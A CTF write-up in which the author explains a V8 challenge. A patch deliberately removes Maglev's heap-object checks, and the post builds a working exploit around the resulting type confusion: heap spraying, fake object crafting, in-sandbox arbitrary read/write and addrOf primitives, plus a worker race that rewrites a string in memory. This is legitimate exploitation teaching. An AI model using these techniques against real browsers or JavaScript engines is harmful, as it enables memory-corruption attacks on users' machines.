+++
title = 'triforce - TRX CTF Quals 2026'
date = 2026-04-25T15:44:05+01:00
draft = true
author = 'Erge'
summary = 'A V8 exploitation challenge I authored for TRX CTF Quals 2026 '
tags = [
    'V8',
    'Maglev'
]
toc = true
+++

## Description 
Maglev (derived from magnetic levitation) is a system of rail transport whose rolling stock is levitated by electromagnets rather than rolled on wheels, eliminating rolling resistance.

## Challenge Overview
The challenge is split into 2 parts, this one, where the objective is gaining R/W inside the V8 heap sandbox, and the second one ([Click here for the writeup!](/writeups/triforce-sbx/)) where the goal is escaping the sandbox and achieving code execution.

Let's take a look at the provided V8 patches, in this post we will only be looking at `triforce.patch`, as `sbx.patch` is only relevant for the second part.

The patch starts by introducing a new builtin method named **Triforce** (and also removes unwanted builtins to prevent cheesy unintended solves).
```diff
diff --git a/src/d8/d8.cc b/src/d8/d8.cc
index bac27d18768..8e7ff3b85db 100644
--- a/src/d8/d8.cc
+++ b/src/d8/d8.cc
@@ -3268,6 +3268,65 @@ void WriteAndFlush(FILE* file,
   fflush(file);
 }
 
+bool hatenoCheese = false;
+
+void Shell::Triforce(const v8::FunctionCallbackInfo<v8::Value>& info) {
+  DCHECK(i::ValidateCallbackInfo(info));
+  Isolate* isolate = info.GetIsolate();
+
+  if (info.Length() != 1) {
+    ThrowError(isolate, "The Triforce is missing!");
+    return;
+  }
+
+  if (!info[0]->IsString()) {
+    ThrowError(isolate, "The real Triforce is a String!");
+    return;
+  }
+
+  Local<String> triforce = info[0].As<String>();
+
+  Local<String> power =
+      String::NewFromUtf8Literal(isolate, "Power", NewStringType::kInternalized);
+
+  Local<String> wisdom =
+      String::NewFromUtf8Literal(isolate, "Wisdom", NewStringType::kInternalized);
+
+  Local<String> courage =
+      String::NewFromUtf8Literal(isolate, "Courage", NewStringType::kInternalized);
+
+  if (!triforce->StringEquals(power)) {
+    ThrowError(isolate, "You are lacking Power...");
+    return;
+  }
+
+  base::OS::Sleep(base::TimeDelta::FromSeconds(1));
+
+  if (!triforce->StringEquals(wisdom)) {
+    ThrowError(isolate, "You are lacking Wisdom...");
+    return;
+  }
+
+  base::OS::Sleep(base::TimeDelta::FromSeconds(1));
+
+  if (!triforce->StringEquals(courage)) {
+    ThrowError(isolate, "You are lacking Courage...");
+    return;
+  }
+
+  hatenoCheese = false;
+  MaybeLocal<String> ret = Shell::ReadFile(isolate, std::getenv("FLAG"), false);
+  hatenoCheese = true;
+
+  if (ret.IsEmpty()) {
+    std::cerr << "Failed to read flag, please open a ticket.\n";
+    ThrowError(isolate, "Failed to read flag, please open a ticket.");
+    return;
+  }
+
+  info.GetReturnValue().Set(ret.ToLocalChecked());
+}
+
 void Shell::Print(const v8::FunctionCallbackInfo<v8::Value>& info) {
   WriteAndFlush(stdout, info);
 }
@@ -4315,9 +4374,12 @@ Local<ObjectTemplate> Shell::CreateGlobalTemplate(Isolate* isolate) {
   global_template->Set(isolate, "version",
                        FunctionTemplate::New(isolate, Version));
 
+  global_template->Set(isolate, "triforce",
+                       FunctionTemplate::New(isolate, Triforce));
   global_template->Set(isolate, "print", FunctionTemplate::New(isolate, Print));
   global_template->Set(isolate, "printErr",
                        FunctionTemplate::New(isolate, PrintErr));
+  /*
   global_template->Set(isolate, "write",
                        FunctionTemplate::New(isolate, WriteStdout));
   if (!i::v8_flags.fuzzing) {
@@ -4343,8 +4405,9 @@ Local<ObjectTemplate> Shell::CreateGlobalTemplate(Isolate* isolate) {
   global_template->Set(isolate, "Realm", Shell::CreateRealmTemplate(isolate));
   global_template->Set(isolate, "performance",
                        Shell::CreatePerformanceTemplate(isolate));
+  */
   global_template->Set(isolate, "Worker", Shell::CreateWorkerTemplate(isolate));
-
+  /*
   // Prevent fuzzers from creating side effects.
   if (!i::v8_flags.fuzzing) {
     global_template->Set(isolate, "os", Shell::CreateOSTemplate(isolate));
@@ -4355,7 +4419,7 @@ Local<ObjectTemplate> Shell::CreateGlobalTemplate(Isolate* isolate) {
     global_template->Set(isolate, "async_hooks",
                          Shell::CreateAsyncHookTemplate(isolate));
   }
-
+  */
   return global_template;
 }
 
@@ -5316,6 +5380,10 @@ void Shell::ReadLine(const v8::FunctionCallbackInfo<v8::Value>& info) {
 // Reads a file into a memory blob.
 std::unique_ptr<base::OS::MemoryMappedFile> Shell::ReadFileData(
     Isolate* isolate, const char* name, bool should_throw) {
+  if (hatenoCheese) {
+    return nullptr;
+  }
+
   std::unique_ptr<base::OS::MemoryMappedFile> file(
       base::OS::MemoryMappedFile::open(
           name, base::OS::MemoryMappedFile::FileMode::kReadOnly));
@@ -5344,7 +5412,7 @@ MaybeLocal<String> Shell::ReadFile(Isolate* isolate, const char* name,
   static_assert(String::kMaxLength <= i::kMaxInt);
   int size = static_cast<int>(full_file_size);
   char* chars = static_cast<char*>(file->memory());
-  if (i::v8_flags.use_external_strings && i::String::IsAscii(chars, size)) {
+  if (i::String::IsAscii(chars, size)) {
     String::ExternalOneByteStringResource* resource =
         new i::OwningExternalOneByteStringResource(
             std::string_view(chars, size));
@@ -5821,6 +5889,7 @@ bool SourceGroup::Execute(Isolate* isolate) {
       printf("Error reading '%s'\n", arg);
       base::OS::ExitProcess(1);
     }
+    hatenoCheese = true;
     Shell::set_script_executed();
     Shell::update_script_size(source->Length());
 
diff --git a/src/d8/d8.h b/src/d8/d8.h
index 913a5c470c5..02332fcee68 100644
--- a/src/d8/d8.h
+++ b/src/d8/d8.h
@@ -672,6 +672,7 @@ class Shell : public i::AllStatic {
 
   static void ResetOnProfileEndListener(Isolate* isolate);
 
+  static void Triforce(const v8::FunctionCallbackInfo<v8::Value>& info);
   static void Print(const v8::FunctionCallbackInfo<v8::Value>& info);
   static void PrintErr(const v8::FunctionCallbackInfo<v8::Value>& info);
   static void WriteStdout(const v8::FunctionCallbackInfo<v8::Value>& info);
```

By reading the builtin's code we can learn the win condition of the challenge; we need to provide a string that is equal to **"Power"**, **"Wisdom"** and **"Courage"** at the same time, with a 1-second interval in-between the string comparisons. 

We also need to provide a "real" string object, therefore it's not possible to use proxy objects or similar stuff.

This might seem impossible at first, as strings are immutable in JS, but thanks to the arb R/W primitives we'll cook up due to the 2nd part of the patch we'll be able to get our flag.

Talking about said the patch:
```diff
diff --git a/src/maglev/maglev-reducer.h b/src/maglev/maglev-reducer.h
index a607dc81a8d..c071240d17c 100644
--- a/src/maglev/maglev-reducer.h
+++ b/src/maglev/maglev-reducer.h
@@ -284,11 +284,14 @@ class MaglevReducer {
   }
 
   static enum CheckType GetCheckType(NodeType type, ValueNode* target) {
-    if (NodeTypeIs(type, NodeType::kAnyHeapObject)) {
-      if (target && target->Is<Phi>()) {
-        target->Cast<Phi>()->SetUseRequiresHeapObject();
-      }
+    if (1) {
       return CheckType::kOmitHeapObjectCheck;
+      /*Do Clankers dream of Tokenized Sheep?
+      https://issues.chromium.org/issues/457296138
+      https://issues.chromium.org/issues/447039449
+      https://issues.chromium.org/issues/392938070
+      https://issues.chromium.org/issues/40671685
+      */
     } else {
       return CheckType::kCheckHeapObject;
     }
```

Leaving the issues aside... (Read them if you want a laugh)
![discord.png](/images/triforce/discord.png)

The patch is making `GetCheckType()` inside V8's mid-tier JIT compiler **Maglev** always return `CheckType::kOmitHeapObjectCheck`.

Let's see what this means and how we can exploit it.

## Maglev
Read [this](https://v8.dev/blog/maglev) for an overview on Maglev.

Maglev performs many optimizations, one of which is tracking the types of its nodes to decide if omitting certain checks is safe or not. 

For example Maglev normally emits a heap-object check unless the value is statically determined to be a heap object, the patch changes this behaviour and makes it so Maglev always elides these checks, even when it's unsafe to do so.

Let's try a little example:
```js
function foo(x) {
  return x[0];
}

%PrepareFunctionForOptimization(foo);
foo([1, 2, 3]);
%OptimizeFunctionOnNextCall(foo);
foo([1, 2, 3]);

foo(0xbeef);
```
In this case the function will be optimized by **Turbofan**, not Maglev, therefore it should deoptimize safely.

Let's run it with this flag `--trace-deopt` to observe its behaviour:
```bash
$ ./d8 --allow-natives-syntax --trace-deopt test.js 
[bailout (kind: deopt-eager, reason: Smi): begin. deoptimizing 0x3bbf010192b9 <JSFunction foo (sfi = 0x3bbf010191e9)>, 0x0a80010002a9 <Code TURBOFAN_JS>, opt id 0, bytecode offset 1, deopt exit 0, FP to SP delta 32, caller SP 0x7ffc237ea7b0, pc 0x565c67c000cc]
```
As expected it's deoptimizing safely as the function wasn't optimized for an Smi. 

Now let's try using Maglev:
```js
function foo(x) {
  return x[0];
}

%PrepareFunctionForOptimization(foo);
foo([1, 2, 3]);
%OptimizeMaglevOnNextCall(foo);
foo([1, 2, 3]);

foo(0xbeef);
```
```bash
$ ./d8 --allow-natives-syntax --trace-deopt test.js 
Received signal 11 SEGV_ACCERR 000000017ddd

==== C stack trace ===============================

./d8(_ZN2v84base5debug10StackTraceC1Ev+0x1e)[0x5dcc6e8d928e]
./d8(+0x3b981d6)[0x5dcc6e8d91d6]
/lib/x86_64-linux-gnu/libc.so.6(+0x45330)[0x71cab3a45330]
[0x5dccce68005b]
[end of stack trace]
Segmentation fault (core dumped)
```

Due to the patch Maglev skips the necessary checks, and it ends up crashing because it's interpreting an Smi as an heap object, we therefore have a type confusion we can exploit.

## The exploit
Given this primitive there are plenty of paths one could take to exploit it, I'll explain the one I used, which while overcomplicated I believe to be interesting.

Consider this snippet of code:
```js
const conv_ab = new ArrayBuffer(8);
const conv_f64 = new Float64Array(conv_ab);
const conv_u64 = new BigUint64Array(conv_ab);

const EMPTY_PROPERTIES_ADDR = 0x7e5n;
const MAP_JSARR_PACKED_DOUBLES_ADDR = 0x100ba71n;
const FIXED_ARRAY = 0x38c002an;
const EVIL_SMI = (Number(FIXED_ARRAY) / 2);

function itof(x) {
  conv_u64[0] = BigInt(x);
  return conv_f64[0];
}

function ftoi(x) {
  conv_f64[0] = x;
  return conv_u64[0];
}

const spray = new Array(0x4fe0000/8); //FIXED_ARRAY should be constant
spray[2] = itof(MAP_JSARR_PACKED_DOUBLES_ADDR << 8n);
spray[3] = itof(0xbeefn >> 8n);

function trigger(obj, x) {  
  let y = x[0]; //Maglev infers x to be an HeapObj
  y += 0.1;
  obj.p = x; //Maglev doesn't update the object map :)
  return y;
}

let target = { p: {a: 1} };
target.p = [1.1, 2.2, 3.3];

%PrepareFunctionForOptimization(trigger);
trigger(target, [1.1]);
%OptimizeMaglevOnNextCall(trigger);
trigger(target, [1.1]);

trigger(target, EVIL_SMI);
```

Let's try running with `--verify-heap`

```bash
$ ./d8 --allow-natives-syntax --verify-heap test.js 


#
# Fatal error
# Check failed: r.IsHeapObject() implies IsHeapObject(value).
#
#
#
#FailureMessage Object: 0x7ffc860c34c0
==== C stack trace ===============================

    ./d8(v8::base::debug::StackTrace::StackTrace()+0x1e) [0x56381a23b28e]
    ./d8(+0x3b97a9b) [0x56381a23aa9b]
    ./d8(V8_Fatal(char const*, ...)+0x16f) [0x56381a22bc5f]
    ./d8(v8::internal::JSObject::JSObjectVerify(v8::internal::Isolate*)+0x5ba) [0x563818a64aea]
    ./d8(v8::internal::HeapObject::HeapObjectVerify(v8::internal::Isolate*)+0x1ec) [0x563818a620ac]
    ./d8(v8::internal::Object::ObjectVerify(v8::internal::Tagged<v8::internal::Object>, v8::internal::Isolate*)+0x70) [0x563818a61e40]
    ./d8(v8::internal::HeapVerification::VerifyObject(v8::internal::Tagged<v8::internal::HeapObject>)+0x78) [0x563818ba2a58]
    ./d8(v8::internal::SemiSpaceNewSpace::Verify(v8::internal::Isolate*, v8::internal::SpaceVerificationVisitor*) const+0xaa) [0x563818c4f60a]
    ./d8(v8::internal::HeapVerification::Verify()+0x1ee) [0x563818ba246e]
    ./d8(v8::internal::HeapVerifier::VerifyHeap(v8::internal::Heap*)+0x13e) [0x563818ba9b4e]
    ./d8(v8::internal::Heap::TearDownWithSharedHeap()+0x31) [0x563818bcfe61]
    ./d8(v8::internal::Isolate::Deinit()+0x488) [0x563818ac9e18]
    ./d8(v8::internal::Isolate::Deinitialize(v8::internal::Isolate*)+0xac) [0x563818ac986c]
    ./d8(v8::internal::Isolate::Delete(v8::internal::Isolate*)+0xe) [0x563818ac97ae]
    ./d8(v8::Shell::OnExit(v8::Isolate*, bool)+0xbf) [0x5638188573ff]
    ./d8(v8::Shell::Main(int, char**)+0xfe9) [0x563818868d69]
    /lib/x86_64-linux-gnu/libc.so.6(+0x2a1ca) [0x7d15ccc2a1ca]
    /lib/x86_64-linux-gnu/libc.so.6(__libc_start_main+0x8b) [0x7d15ccc2a28b]
    ./d8(_start+0x2a) [0x56381883302a]
Trace/breakpoint trap (core dumped)
```

We are abusing the omitted heapObj checks to make an Smi land inside an heapObj field of a JS object, without updating its map, which is why V8 aborts when running with `--verify-heap`.

We are also crafting a fake object layout at the memory address pointed by the Smi.

Now consider these functions optimized on our specific object shape:
```js
function get(x) {
  return x.p[0];
}

function set(x, y) {
  x.p[0] = y;
}

for (let i = 0; i < 1000; i++) {
  get(target);
  set(target, 1.1);
}
```

Since we can corrupt its field without updating the map those functions won't deoptimize and will dereference our Smi as our crafted fake object.

```js
const conv_ab = new ArrayBuffer(8);
const conv_f64 = new Float64Array(conv_ab);
const conv_u64 = new BigUint64Array(conv_ab);

const EMPTY_PROPERTIES_ADDR = 0x7e5n;
const MAP_JSARR_PACKED_DOUBLES_ADDR = 0x100ba71n;
const FIXED_ARRAY = 0x38c002an;
const EVIL_SMI = (Number(FIXED_ARRAY) / 2);

function itof(x) {
  conv_u64[0] = BigInt(x);
  return conv_f64[0];
}

function ftoi(x) {
  conv_f64[0] = x;
  return conv_u64[0];
}

const spray = new Array(0x4fe0000/8); //FIXED_ARRAY should be constant
spray[2] = itof(MAP_JSARR_PACKED_DOUBLES_ADDR << 8n);
spray[3] = itof(0xbeefn << 8n);

function trigger(obj, x) {  
  let y = x[0]; //Maglev infers x must be an HeapObj
  y += 0.1;
  obj.p = x; //Maglev doesn't update the object map :)
  return y;
}

let target = { p: {a: 1} };
target.p = [1.1, 2.2, 3.3];

function get(x) {
  return x.p[0];
}

function set(x, y) {
  x.p[0] = y;
}

%PrepareFunctionForOptimization(get);
%PrepareFunctionForOptimization(set);
get(target);
set(target, 1.1);
%OptimizeMaglevOnNextCall(get);
%OptimizeMaglevOnNextCall(set);
get(target);
set(target, 1.1);

%PrepareFunctionForOptimization(trigger);
trigger(target, [1.1]);
%OptimizeMaglevOnNextCall(trigger);
trigger(target, [1.1]);

trigger(target, EVIL_SMI);

function caged_write(x, y) {
  spray[3] = itof((BigInt(x)-7n) << 8n);
  const tmp = ftoi(get(target)) & 0xffffffff00000000n;
  set(target, itof(tmp | BigInt(y)));
}

function caged_read(x) {
  spray[3] = itof((BigInt(x)-7n) << 8n);
  return (ftoi(get(target))) & 0xffffffffn;
}

caged_write(0x41414141n, 0xdeadbeef);
```

```bash
$ ./d8 --allow-natives-syntax test.js 
Received signal 11 SEGV_ACCERR 374b41414141

==== C stack trace ===============================

./d8(_ZN2v84base5debug10StackTraceC1Ev+0x1e)[0x56e3eb16228e]
./d8(+0x3b981d6)[0x56e3eb1621d6]
/lib/x86_64-linux-gnu/libc.so.6(+0x45330)[0x73ebb2e45330]
[0x56e3c41c0090]
[end of stack trace]
Segmentation fault (core dumped)
```

We now have all we need to build our arb R/W primitives and get the flag from the **Triforce** method.

We will simply be using a Worker thread to call the method with a specific thread while our main thread will concurrently modify the value of the string to pass the checks.

## Full exploit
```js
const conv_ab = new ArrayBuffer(8);
const conv_f64 = new Float64Array(conv_ab);
const conv_u64 = new BigUint64Array(conv_ab);

const EMPTY_PROPERTIES_ADDR = 0x7e5n;
const MAP_JSARR_PACKED_DOUBLES_ADDR = 0x100ba71n;
const FIXED_ARRAY = 0x38c002an;
let FIXED_OBJ_ARRAY = 0x8d00018n;
const EVIL_SMI = (Number(FIXED_ARRAY) / 2);
let flag = {};

function itof(x) {
  conv_u64[0] = BigInt(x);
  return conv_f64[0];
}

function ftoi(x) {
  conv_f64[0] = x;
  return conv_u64[0];
}

function spin(ms) {
  let end = Date.now() + ms;
  while(Date.now() < end);
};

function gc() {
  new ArrayBuffer(1);
  new ArrayBuffer(1);
  new ArrayBuffer(2 ** 30);
}

const spray = new Array(0x4fe0000/8); //FixedDoubleArray address should be constant
spray[2] = itof(MAP_JSARR_PACKED_DOUBLES_ADDR << 8n);
spray[3] = itof(FIXED_OBJ_ARRAY >> 8n);

function trigger(obj, x) {  
  let y = x[0]; //x must be an HeapObj
  y += 0.1;
  obj.p = x; //no check here :)
  return y;
}

let target = { p: {a: 1} };
target.p = [1.1, 2.2, 3.3];

function get(x) {
  return x.p[0];
}

function set(x, y) {
  x.p[0] = y;
}

for (let i = 0; i < 1000; i++) {
  get(target);
  set(target, 1.1);
}

for (let i = 0; i < 1000; i++) {
  trigger(target, [1.1]);
}

spin(1000);

trigger(target, EVIL_SMI);

function caged_write(x, y) {
  spray[3] = itof((BigInt(x)-7n) << 8n);
  const tmp = ftoi(get(target)) & 0xffffffff00000000n;
  set(target, itof(tmp | BigInt(y)));
}

function caged_read(x) {
  spray[3] = itof((BigInt(x)-7n) << 8n);
  return (ftoi(get(target))) & 0xffffffffn;
}

const spray2 = new Array(0x4fe0000/8);
spray2[0] = spray2;

const marker = caged_read(FIXED_OBJ_ARRAY-8n);

if (marker != 0x5ddn) {
  print("Unexpected obj array marker: " + marker.toString(16) + ", fixing offset...");
  FIXED_OBJ_ARRAY = 0x8cc0018n;
}

function addrOf(obj) {
  spray2[0] = obj;
  return Number(caged_read(FIXED_OBJ_ARRAY)) & 0xffffffff;
}

let sbox_buf = new ArrayBuffer(0x1337);

function build_primitives() {
  let sbox_buf_addr = addrOf(sbox_buf) & ~1;

  caged_write(sbox_buf_addr + 0x14, 0xe0000000);
  caged_write(sbox_buf_addr + 0x18, 0xffffffff);

  caged_write(sbox_buf_addr + 0x1c, 0xe0000000);
  caged_write(sbox_buf_addr + 0x20, 0xffffffff);

  caged_write(sbox_buf_addr + 0x24, 0x00000000);
  caged_write(sbox_buf_addr + 0x28, 0x00000000);
}
build_primitives();

let sbox_view = new DataView(sbox_buf);
r32 = (addr) => sbox_view.getUint32(addr, true);
w32 = (addr, val) => sbox_view.setUint32(addr, val, true);

gc();
gc();

let workerScript = `
function spin(ms) {
  let end = Date.now() + ms;
  while(Date.now() < end);
};

function gc() {
  new ArrayBuffer(1);
  new ArrayBuffer(1);
  new ArrayBuffer(2 ** 30);
}

let arr = new Array(0x2000).fill(0x42);
arr[0] = 0x4d;
arr[1] = 0x41;
arr[2] = 0x52;
arr[3] = 0x4b;
const str = String.fromCharCode(...arr);

gc();
gc();

while(1){
  let a;
  try { 
    a = triforce(str);
  } catch(e) {
    continue;
  }
  print("Sending flag to main thread...");
  postMessage(a);  
  break;
}
`;

let worker = new Worker(workerScript, {type: 'string'});
worker.onmessage = (e) => {
  print("Received message from worker");
  flag = e.data;
  print("Flag from worker: " + flag);
}

spin(2000);

let addr = 0x8922c00;

for (; r32(addr) != 0x4b52414d; addr+=4) {}

print("Found string marker at: " + addr.toString(16));

w32(addr - 0x4, 5); //len
w32(addr, 0x65776f50); //Power
w32(addr + 0x4, 0x72);
spin(1000);

w32(addr - 0x4, 6); //len
w32(addr, 0x64736957); //Wisdom
w32(addr + 0x4, 0x6d6f);
spin(1000);

w32(addr - 0x4, 7); //len
w32(addr, 0x72756f43); //Courage
w32(addr + 0x4, 0x656761);
spin(1000);
```